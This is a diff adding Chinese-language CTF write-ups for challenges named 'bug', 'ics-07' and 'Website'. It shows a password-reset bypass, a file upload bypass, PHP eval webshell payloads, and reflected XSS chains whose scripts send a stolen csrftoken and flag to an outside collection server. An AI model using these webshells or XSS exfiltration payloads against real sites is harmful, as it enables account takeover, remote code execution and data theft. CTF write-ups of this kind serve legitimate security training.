@@ -623,6 +623,201 @@ payload:
 
 flag:`hello',1660,1660),((selselectect GROUP_CONCAT(i_am_flag) FROfromM hello_flag_is_here),1660,1660)#.jpg`
 
+### bug
+
+拿到网址，先随便玩一玩,目录扫扫,没找到啥有意思的
+
+登入前有.注册,登入,找回密码的页面,url有点文件读取的感觉
+
+考虑sql注入,文件读取,越权.先注册个号玩一玩,发现里面有个管理页面需要admin权限,想办法搞到admin账号,看了下cookie,username有点意思,看起来像md5加密`5d39c2d4a0776ed48f3ec303520788c5`,去查了一下没查到，那就换个点吧。
+
+url:`http://111.198.29.45:44727/index.php?module=index&do=member&uid=5`
+
+试试能不能通过index来任意文件读取,发现不行是白名单限制
+
+sql注入试起来太久了,去看看更改密码吧,
+
+http头:
+
+```
+POST /index.php?module=findpwd&step=1&doSubmit=yes HTTP/1.1
+
+username=ccreater&birthday=2015%2F01%2F01&address=aa
+```
+
+发现step和username有点搞头.
+
+修改step,发现不行,重置之前注册账号的密码进入第二步,
+
+```
+POST /index.php?module=findpwd&step=2&doSubmit=yes HTTP/1.1
+
+username=ccreater&newpwd=admin
+```
+
+修改username试试,成功,美滋滋
+
+进入管理界面，提示ip地址错误,修改常见识别ip地址的属性,成功得到下一步的提示`<!-- index.php?module=filemanage&do=???-->`
+
+emmm,随便试一下,upload......成功了
+
+提示是图片当不仅仅只是图片,文件上传喽。
+
+一番测试后发现修改content-type,以.php5作为后缀,内容为`<script language="php">phpinfo();</script>`时得到flag
+
+吐槽一下,你知道我想要什么是真的无语,你不说我咋知道
+
+### ics-07
+
+进入界面,拿到关键代码
+
+```php
+ <?php
+     if ($_SESSION['admin']) {
+       $con = $_POST['con'];
+       $file = $_POST['file'];
+       $filename = "backup/".$file;
+
+       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
+          die("Bad file extension");
+       }else{
+            chdir('uploaded');
+           $f = fopen($filename, 'w');
+           fwrite($f, $con);
+           fclose($f);
+       }
+     }
+     ?>
+
+    <?php
+      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
+        include 'config.php';
+        $id = mysql_real_escape_string($_GET[id]);
+        $sql="select * from cetc007.user where id='$id'";
+        $result = mysql_query($sql);
+        $result = mysql_fetch_object($result);
+      } else {
+        $result = False;
+        die();
+      }
+
+      if(!$result)die("<br >something wae wrong ! <br>");
+      if($result){
+        echo "id: ".$result->id."</br>";
+        echo "name:".$result->user."</br>";
+        $_SESSION['admin'] = True;
+      }
+     ?>
+```
+
+当$_SESSION['admin'] = True时,就可以写文件了
+
+根据`isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9'`
+
+猜测id=1时就可以读取到内容,但是要绕过`floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9'`,floatval('1.0+9')!==1,并且`select * from cetc007.user where id='1'`相当于`select * from cetc007.user where id='1.0+9'`
+
+payload=`/view-source.php?page=flag.php&id=1.0+9`
+
+接下来就是绕过`preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)`
+
+有一下几点思路:
+
+- 看别人wp
+- apache解析漏洞
+- .htaccess和.user.ini
+- 特殊后缀
+
+经过测试后面三个均无法利用
+
+看别人wp发现
+
+Payload : `con=<?php @eval($_POST[cmd]);?>&file=test.php/1.php/..`
+
+`con=<?php @eval($_POST[cmd]);?>&file=../orz.php/.`
+
+原理不明
+
+### Website
+
+注册登录后,发现识别用户的cookie是username,是一个奇奇怪怪的base64编码的内容,扫目录发现了test.php,看到base64编码后的内容以为可以用这个来得到admin的cookie后面无论用什么参数都没用,于是直接把页面里的内容复制到cookie里就成了admin.emmmmm......
+
+getflag:HITBCTF{j50nP_1s_VulN3r4bLe}
+
+#### 思路一
+
+一个xss，waf并不严格，有好多种做法，存在多处xss。
+
+首先先随便注册个账号登录
+
+site填入自己的服务器地址，发现他会访问。
+
+于是入口点就是：构造一个富含xss的链接发给他。
+
+xss的地方很多，最好利用的是
+
+这个getInfo接口，返回 `jsonp` 数据，存在反射型xss,而且没上waf。
+
+`jsonp` 的 `referer` 检查，可以利用302跳转解决。
+
+于是我们的攻击链扩充到了：
+
+```
+链接->302 jsonp xss
+```
+
+问题是如何拿到ﬂag？
+
+经过测试发现ﬂag是通过 `getﬂag` 接口获取
+
+需要的参数是 `csrftoken`
+
+```
+http://47.88.218.105:20010/getflag.php?csrftoken=c1a10e97f9c2fa973299fa3154f38b58
+```
+
+能否有权限获取ﬂag是读取 `jsonp` 中的 `username` ，这个 `username` 是后端解密 `cookie` 中的 `username` 得到的明文
+
+`cookie` 中的 `username` 受 `http-only` 保护不可读取，也没有能显示出 `cookie` 中加密的 `username` 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了。
+
+整个利用如下：
+
+`链接 --> 302到 jsonp xss --> 提取 jsonp 中 csrftoken 字段 --> xhr 控制读取 flag --> 返回 flag 到 xss 平台` 发送链接的php内容
+
+`b.js` 内容:
+
+```
+bash Data: {'flag':'HITB{j50nP_1s_VulN3r4bLe}','csrftoken':'058807fed91d1b8807688bd258710cbe'} IP: 47.88.218.105 Date and Time: 25 August, 2017, 12:31 pm Referer: http://47.88.218.105:20010/action.php? callback=%3Cscript+src=%22http://123.206.216.198/b.js%22%3E%3C%2Fscript%3E
+```
+
+getflag
+
+```
+HITB{j50nP_1s_VulN3r4bLe}
+```
+
+#### 思路二
+
+注册登录之后，发现一个有趣的链接
+
+```
+http://47.88.218.105:20010/action.php?callback=getInfo
+```
+
+经过分析，`callback` 参数可以被控制
+
+由此写payload:
+
+```
+http://47.88.218.105:20010/action.php?callback=%3Chtml%3E%3Cbody%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//cdn.bootcss.com/jquery/3.1.1/jquery.min.js%22%3E%3C/script%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//<OUR_SERVER_IP>/test.js%22%3E%3C/script%3E%3Cdiv%3E
+```
+
+`test.js` 的内容:
+
+`js window.onload = function() { var a = document.getElementsByTagName('div')[0], data = eval(a.innerHTML); $.get("getflag.php",{ csrftoken: data['csrftoken'] },function(data,status) { feedback(data); }); } function feedback(data) { var data = encodeURIComponent(data), img = document.createElement('img'); img.src = '`https://requestb.in/xk998hxk?`' + data; console.log(img); document.body.appendChild(img); }` getflag
+
+```
+HITB{j50nP_1s_VulN3r4bLe}
+```
 
 ## bugku
 
